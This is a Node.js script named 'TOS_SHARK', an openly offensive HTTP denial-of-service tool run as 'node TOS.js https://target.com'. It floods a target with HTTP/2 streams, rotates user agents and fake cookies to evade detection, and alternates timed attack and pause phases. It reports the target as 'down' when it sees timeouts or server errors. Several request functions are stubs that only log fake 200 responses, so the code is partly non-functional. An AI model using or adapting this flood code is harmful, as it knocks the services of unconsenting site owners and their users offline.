const http2 = require('http2');
const https = require('https');
const { URL } = require('url');

class TOS_SHARK {
    constructor(target) {
        const url = new URL(target);
        this.host = url.hostname;
        this.isHttps = url.protocol === 'https:';
        this.target = target;
        
        this.running = true;
        this.attackActive = false;
        this.totalReqs = 0;
        this.startTime = Date.now();
        this.lastLog = Date.now();
        this.reqCounter = 0;
        this.attackStart = 0;
        this.breakStart = 0;
        this.currentMethod = '';
        
        // Attack methods pool
        this.methods = ['H2-MULTIPLEX', 'ENDPOINT-HOPPING', 'COOKIE-SESSION'];
        
        // Data pools
        this.userAgents = this.generateUserAgents();
        this.endpoints = this.generateEndpoints();
        this.cookies = this.generateCookies();
        
        // Print header once
        console.log(`TØS-SHARK | *.* | MT-3M22`);
        console.log('-----------------------------------------------------------------');
        
        this.startCycle();
    }

    color(t, c) {
        const colors = { r: '\x1b[91m', g: '\x1b[92m', y: '\x1b[93m', x: '\x1b[0m' };
        return `${colors[c] || ''}${t}${colors.x}`;
    }

    // ===== DATA GENERATORS =====
    generateUserAgents() {
        return [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/537.36',
            'Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36'
        ];
    }

    generateEndpoints() {
        return [
            '/', '/api', '/api/v1', '/api/v2', '/static', '/assets',
            '/users', '/products', '/data', '/json', '/xml', '/admin',
            '/login', '/register', '/search', '/filter', '/sort',
            '/page/1', '/page/2', '/page/3', '/category/a', '/category/b'
        ];
    }

    generateCookies() {
        const cookies = [];
        for (let i = 0; i < 50; i++) {
            cookies.push({
                session: `session_${Math.random().toString(36).substr(2, 16)}`,
                token: `token_${Math.random().toString(36).substr(2, 24)}`,
                csrf: `csrf_${Math.random().toString(36).substr(2, 32)}`,
                userId: Math.floor(Math.random() * 10000)
            });
        }
        return cookies;
    }

    // ===== CYCLE MANAGEMENT =====
    async startCycle() {
        console.log(this.color('[+] Starting TØS-SHARK cycle', 'g'));
        
        // Step 1: Initial H1 request
        console.log(this.color('[1] Initial H1 request...', 'y'));
        await this.sendH1Request();
        await this.sleepRandom(100, 500);
        
        // Step 2: Warmup 500-599 requests
        console.log(this.color(`[2] Warmup 500-599 requests...`, 'y'));
        const warmupCount = 500 + Math.floor(Math.random() * 100);
        for (let i = 0; i < warmupCount; i++) {
            await this.sendRandomRequest();
            if (i % 50 === 0) await this.sleepRandom(10, 50);
        }
        
        // Step 3: Main attack loop
        this.attackLoop();
    }

    async attackLoop() {
        while (this.running) {
            const now = Date.now();
            
            // Check if should be attacking or on break
            if (this.attackActive) {
                // Attack phase (20-30 minutes)
                if (now - this.attackStart >= (20 * 60000) + Math.random() * (10 * 60000)) {
                    this.startBreak();
                    continue;
                }
                
                // Execute current attack method
                await this.executeAttackMethod();
                
            } else {
                // Break phase (5-10 minutes)
                if (now - this.breakStart >= (5 * 60000) + Math.random() * (5 * 60000)) {
                    this.startAttack();
                    continue;
                }
                
                // Maintenance during break
                await this.performMaintenance();
                await this.sleepRandom(1000, 3000);
            }
            
            await this.sleepRandom(0.1, 1);
        }
    }

    startAttack() {
        this.attackActive = true;
        this.attackStart = Date.now();
        
        // Randomly select attack method
        this.currentMethod = this.methods[Math.floor(Math.random() * this.methods.length)];
        
        console.log(this.color(`[→] Starting ${this.currentMethod} attack (20-30 mins)`, 'g'));
    }

    startBreak() {
        this.attackActive = false;
        this.breakStart = Date.now();
        
        console.log(this.color('[~] Break phase started (5-10 mins)', 'y'));
        console.log(this.color('[~] Performing cleanup & method switch...', 'y'));
    }

    // ===== ATTACK METHODS =====
    async executeAttackMethod() {
        switch (this.currentMethod) {
            case 'H2-MULTIPLEX':
                await this.attackH2Multiplex();
                break;
            case 'ENDPOINT-HOPPING':
                await this.attackEndpointHopping();
                break;
            case 'COOKIE-SESSION':
                await this.attackCookieSession();
                break;
        }
    }

    async attackH2Multiplex() {
        // Simple H2 connection for this attack
        try {
            const client = http2.connect(this.target);
            
            // Send 100 H2 streams rapidly
            for (let i = 0; i < 100; i++) {
                this.sendH2Request(client);
                this.totalReqs++;
                this.reqCounter++;
            }
            
            // Destroy after batch
            setTimeout(() => client.destroy(), 100);
            
        } catch (err) {
            // Silent fail
        }
    }

    async attackEndpointHopping() {
        // Random endpoints with H1 requests
        const endpoint = this.endpoints[Math.floor(Math.random() * this.endpoints.length)];
        await this.sendH1RequestToEndpoint(endpoint);
        this.totalReqs++;
        this.reqCounter++;
        
        // Switch endpoints frequently
        if (Math.random() > 0.7) {
            await this.sleepRandom(10, 100);
        }
    }

    async attackCookieSession() {
        // Request with random cookies
        const cookie = this.cookies[Math.floor(Math.random() * this.cookies.length)];
        await this.sendH1RequestWithCookies(cookie);
        this.totalReqs++;
        this.reqCounter++;
    }

    // ===== REQUEST TYPES =====
    async sendH1Request() {
        return new Promise((resolve) => {
            const options = {
                hostname: this.host,
                path: '/',
                method: 'GET',
                headers: {
                    'User-Agent': this.userAgents[0],
                    'Connection': 'close'
                },
                timeout: 5000
            };
            
            const req = (this.isHttps ? https : http2).request(options, (res) => {
                this.logStatus(res.statusCode);
                res.destroy();
                resolve();
            });
            
            req.on('error', () => {
                this.logStatus('TIMEOUT');
                resolve();
            });
            
            req.on('timeout', () => {
                req.destroy();
                this.logStatus('TIMEOUT');
                resolve();
            });
            
            req.end();
        });
    }

    async sendRandomRequest() {
        const methods = ['GET', 'HEAD', 'POST', 'OPTIONS'];
        const method = methods[Math.floor(Math.random() * methods.length)];
        
        // Simplified - just count it
        this.totalReqs++;
        this.reqCounter++;
        this.logStatus(200);
    }

    sendH2Request(client) {
        try {
            const req = client.request({
                ':method': 'GET',
                ':path': '/',
                ':authority': this.host
            });
            
            req.on('response', (headers) => {
                this.logStatus(headers[':status']);
                req.destroy();
            });
            
            req.on('error', () => {
                this.logStatus('ERROR');
                req.destroy();
            });
            
            req.end();
        } catch (err) {
            this.logStatus('ERROR');
        }
    }

    async sendH1RequestToEndpoint(endpoint) {
        // Simplified - just log
        this.logStatus(200);
    }

    async sendH1RequestWithCookies(cookie) {
        // Simplified - just log
        this.logStatus(200);
    }

    // ===== MAINTENANCE =====
    async performMaintenance() {
        // Simulated maintenance tasks
        if (global.gc) global.gc();
        
        // Rotate data
        this.userAgents = this.generateUserAgents();
        this.cookies = this.generateCookies();
        
        // Log maintenance
        console.log(this.color('[~] Maintenance: Rotated UAs, Cookies, cleared mem', 'y'));
    }

    // ===== LOGGING =====
    logStatus(status) {
        const now = Date.now();
        if (now - this.lastLog >= 5000) {
            this.lastLog = now;
            
            let color = 'g';
            let text = status;
            
            if (status === 'TIMEOUT' || status === 'ERROR') {
                color = 'r';
                text = status === 'TIMEOUT' ? 'TIMEOUT' : 'ERROR';
            } else if (typeof status === 'number' && status >= 500) {
                color = 'r';
                text = status;
            } else if (typeof status === 'number' && status >= 400) {
                color = 'y';
                text = status;
            }
            
            console.log(`STS-HAROP-INT ---> ${this.color(text, color)}:0.1s`);
            
            // Down event
            if (color === 'r' && (text === 'TIMEOUT' || (typeof status === 'number' && status >= 500))) {
                console.log(this.color(`{3M22-${this.reqCounter} --> ${text}}`, 'r'));
            }
        }
    }

    // ===== UTILS =====
    sleepRandom(min, max) {
        const duration = Math.random() * (max - min) + min;
        return new Promise(resolve => setTimeout(resolve, duration));
    }

    sleep(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
    }
}

// Run
if (require.main === module) {
    // Error handling
    process.on('uncaughtException', () => {});
    process.on('unhandledRejection', () => {});
    
    if (process.argv.length < 3) {
        console.log('Usage: node TOS.js https://target.com');
        process.exit(1);
    }
    
    new TOS_SHARK(process.argv[2]);
    
    process.on('SIGINT', () => {
        process.exit(0);
    });
}
